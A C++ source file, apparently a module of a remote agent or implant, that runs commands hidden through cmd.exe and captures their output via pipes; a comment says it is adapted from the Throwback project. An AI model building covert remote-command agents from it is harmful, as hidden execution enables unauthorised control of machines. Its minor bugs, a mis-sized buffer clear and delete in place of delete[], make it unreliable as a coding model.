#include "stdafx.h"
#include <iostream>
#include <string>
#include "AgentShellCmd.h"

std::string AgentShellCmd::runShellCmd(std::string command)
{
	/*
	Run shell command using cmd.exe or future powershell
	support. This was addpated from:
	https://github.com/silentbreaksec/Throwback/blob/master/Throwback/Throwback.cpp#L348
	*/
	memoryLog(0, "runShellCmd() starting to run command");
	wchar_t *command2 = NULL;
	std::string tempErr;
	std::string tempCmd;
	tempCmd = "cmd.exe /c ";
	tempCmd.append(command);
	command2 = new wchar_t[tempCmd.length() + 1];
	command2[tempCmd.length()] = L'\0';
	MultiByteToWideChar(CP_ACP, 0, tempCmd.c_str(), -1, command2, tempCmd.length());
	memoryLog(0, "runShellCmd() Run command built");
	/*
	BOOL WINAPI CreatePipe(
		  _Out_    PHANDLE               hReadPipe,
		  _Out_    PHANDLE               hWritePipe,
		  _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,
		  _In_     DWORD                 nSize
		);
	*/
	HANDLE hReadPipe;
	HANDLE hWritePipe;
	SECURITY_ATTRIBUTES sa;
	// build size of sa to var
	ZeroMemory(
		&sa,
		sizeof(SECURITY_ATTRIBUTES)
		);
	/*
	typedef struct _SECURITY_ATTRIBUTES {
		  DWORD  nLength;
		  LPVOID lpSecurityDescriptor;
		  BOOL   bInheritHandle;
		} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
	*/
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL; //calling proc token 
	sa.bInheritHandle = TRUE; // calling proc gets handle acc
	memoryLog(0, "runShellCmd() SECURITY_ATTRIBUTES struct set for pipe");
	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
	{
		// Pipe failed to create 
		auto err = std::to_string(GetLastError());
		tempErr.append("runShellCmd() CreatePipe faild to build error code: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		return tempErr;
	}
	memoryLog(0, "runShellCmd() CreatePipe is built for StdErr and StdOut");
	
	/*
	BOOL WINAPI CreateProcess(
		  _In_opt_    LPCTSTR               lpApplicationName,
		  _Inout_opt_ LPTSTR                lpCommandLine,
		  _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
		  _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
		  _In_        BOOL                  bInheritHandles,
		  _In_        DWORD                 dwCreationFlags,
		  _In_opt_    LPVOID                lpEnvironment,
		  _In_opt_    LPCTSTR               lpCurrentDirectory,
		  _In_        LPSTARTUPINFO         lpStartupInfo,
		  _Out_       LPPROCESS_INFORMATION lpProcessInformation
		);
	*/
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	DWORD dwResult = 0;

	// setup STARTUPINFO struc 
	ZeroMemory(
		&si, 
		sizeof(STARTUPINFOW)
		);
	si.cb = sizeof(STARTUPINFO); // bytes of the struc 
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // required for  hStdInput, hStdOutput, and hStdError
	si.wShowWindow = SW_HIDE; // Hides the window and activates another window. (0)
	si.hStdOutput = hWritePipe; // STARTF_USESTDHANDLES allows handle for input
	si.hStdError = hWritePipe; // dwFlags specifies STARTF_USESTDHANDLES
	memoryLog(0, "runShellCmd() STARTUPINFO & PROCESS_INFORMATION struct built");
	// setup PROCESS_INFORMATION struc
	// This must be setup for the new proc we create to get the info.
	ZeroMemory(
		&pi,
		sizeof(PROCESS_INFORMATION) // setup size of struc for CreateProcessW
		);

	memoryLog(0, "runShellCmd() CreateProcessW starting process");
	dwResult = CreateProcessW(
		NULL, // no app name to run use cmd block
		command2, //command to run
		NULL, // no SA needed in this case
		NULL, // no SA needed for shell
		true, // run as token handle
		CREATE_NO_WINDOW, //flags to set
		NULL, // run from current proc space
		NULL, // no need for unc
		&si, //pointer to struc
		&pi //pointer to struc
		);
	if (dwResult == 0)
	{
		// non-zero is true return error
		auto err = std::to_string(GetLastError());
		tempErr.append("runShellCmd() CreateProcessW faild start process: ");
		tempErr.append(err);
		memoryLog(3, tempErr);
		return tempErr;
	}
	memoryLog(0, "runShellCmd() CreateProcessW process started process");
	/*
	BOOL WINAPI PeekNamedPipe(
		  _In_      HANDLE  hNamedPipe,
		  _Out_opt_ LPVOID  lpBuffer,
		  _In_      DWORD   nBufferSize,
		  _Out_opt_ LPDWORD lpBytesRead,
		  _Out_opt_ LPDWORD lpTotalBytesAvail,
		  _Out_opt_ LPDWORD lpBytesLeftThisMessage
		);
	BOOL WINAPI ReadFile(
		_In_        HANDLE       hFile,
		_Out_       LPVOID       lpBuffer,
		_In_        DWORD        nNumberOfBytesToRead,
		_Out_opt_   LPDWORD      lpNumberOfBytesRead,
		_Inout_opt_ LPOVERLAPPED lpOverlapped
		);
	*/
	// read from pipe handle
	bool readPipe = TRUE;
	
	// setup timeout value
	DWORD timeout = GetTickCount() + 30000;
	const DWORD bufferSize = 2048;
	char data[1];
	std::string finalOutput;
	int strike = 0;

	while (readPipe)
	{
		// TODO: Setup powershell commands?
		DWORD lpTotalBytesAvail = 0; // bytes for pickup
		DWORD lpNumberOfBytesRead = 0;
		dwResult = 0; // for error checking
		char data[bufferSize + 1]; // must zero out buffer
		ZeroMemory(
			&data,
			sizeof(bufferSize + 1)
			);
		Sleep(100);

		PeekNamedPipe(
			hReadPipe,
			NULL, // only check pipe dont read
			NULL, // lpBuffer is NULL
			NULL, // no data to read lpBuffer is NULL
			&lpTotalBytesAvail, // pointer bytes for pickup
			NULL // no data to read lpBuffer is NULL
			);
		// break due to timeout
		if (GetTickCount() > timeout)
		{
			memoryLog(0, "runShellCmd() NamedPipe timed out");
			if (finalOutput.length() == 0 && lpTotalBytesAvail == 0)
			{ 
				break; 
			}
		}
		// break to no data in pipe
		if (finalOutput.length() > 0 && lpTotalBytesAvail == 0)
		{
			// check for strike to break on
			if (strike > 3)
			{
				break;
			}
			else
			{
				strike += 1;
				Sleep(1000);
			}
		}
		if (lpTotalBytesAvail > 0)
		{
			memoryLog(0, "runShellCmd() PeekNamedPipe returned with bytes in pipe");
			// data is ready for pickup
			dwResult = ReadFile(
				hReadPipe, // handle to pipe
				data, // 2049 bytes of room
				bufferSize, // size we can store in data
				&lpNumberOfBytesRead, // pointer to data size read
				NULL // no FILE_FLAG_OVERLAPPED
				);
			if (!dwResult)
			{
				// ReadFile failed, start reporting
				// non-zero is true return error
				auto err = std::to_string(GetLastError());
				tempErr.append("runShellCmd() ReadFile faild to read pipe: ");
				tempErr.append(err);
				memoryLog(3, tempErr);
				finalOutput.append(tempErr);
				break;
			}
			memoryLog(0, "runShellCmd() ReadFile pulled data from pipe");
			// data was ok now append to output
			data[lpNumberOfBytesRead] = '\0';
			finalOutput.append(data);
		}
	}
	std::cout << finalOutput << std::endl;
	// Cleanup pipes
	// PROCESS_INFORMATION must be closed with CloseHandle
	if (command2) delete command2;
	if (pi.hProcess) CloseHandle(pi.hProcess);
	if (pi.hThread) CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);
	CloseHandle(hWritePipe);
	return finalOutput;
}

